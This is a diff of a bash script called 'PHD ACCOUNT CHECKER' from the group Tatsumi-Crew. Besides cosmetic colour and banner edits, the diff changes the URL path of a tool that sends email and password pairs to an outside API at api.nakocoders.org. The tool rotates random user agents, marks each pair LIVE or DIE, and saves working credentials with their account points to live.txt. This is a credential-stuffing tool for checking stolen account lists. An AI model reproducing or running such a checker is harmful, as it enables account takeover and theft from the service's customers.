@@ -1,8 +1,18 @@
 #!/bin/bash
-#Tatsumi-Crew & Arvan Apriyana
+#issued on : 17 agustus 2018
+#coded By Arvan Apriyana
+waktu=$(date '+%Y-%m-%d %H:%M:%S')
+RED="\e[31m"
+GREEN="\e[32m"
+YELLOW="\e[33m"
+CYAN="\e[36m"
+LIGHTGREEN="\e[92m"
+MARGENTA="\e[35m"
+BLUE="\e[34m"
+BOLD="\e[1m"
+NOCOLOR="\e[0m"
 header(){
-echo -e "\e[92m"
-cat << "EOF"
+printf "${GREEN}
          ####################################
          ####################################
          #######                      #######
@@ -11,32 +21,32 @@ cat << "EOF"
          ###############      ###############
          ###############      ###############
          ###############      ###############
-         ###############      ###############
+         ###############      ###############${RED}
          #######    ####      ####    #######
          #######    ####      ####    #######
          #######    ##############    #######
          #######    ##############    #######
          #######                      #######
          ####################################
-         ####################################
+         ####################################s${NOCOLOR}
          ------------------------------------
                  PHD ACCOUNT CHECKER
                Code By: Arvan Apriyana
                  www.tatsumi-crew.net
          ------------------------------------
-EOF
+"
 }
 tatsumi(){
     ua=$(cat ua.txt | sort -R | head -1)
-    curlnya=$(curl -s "http://api.nakocoders.org/papi/hd/api.php?emailna=$1&passwordna=$2" -L)
+    curlnya=$(curl -s "http://api.nakocoders.org/api/phd/api.php?emailna=$1&passwordna=$2" -L)
     livena=$(echo $curlnya | grep -Po '(?<="msg":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
     kontenID=$(echo $curlnya | grep -Po '(?<=Point : )[^<span]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
     if [[ ! $livena =~ "DIE" ]]; then
-        printf "${HIJAU}[LIVE] $1|$2 [Point:$kontenID] [$waktu]\n";
+        printf "${GREEN}[LIVE] $1|$2 [Point:$kontenID] [$waktu]\n";
         echo "[LIVE] $1|$2 [Point:$kontenID] [$waktu]" >> live.txt
         printf "${NORMAL}"
     else
-        printf "${MERAH}[DIE] $1|$2 [$waktu]\n";
+        printf "${RED}[DIE] $1|$2 [$waktu]\n";
         printf "${NORMAL}"
     fi
 }
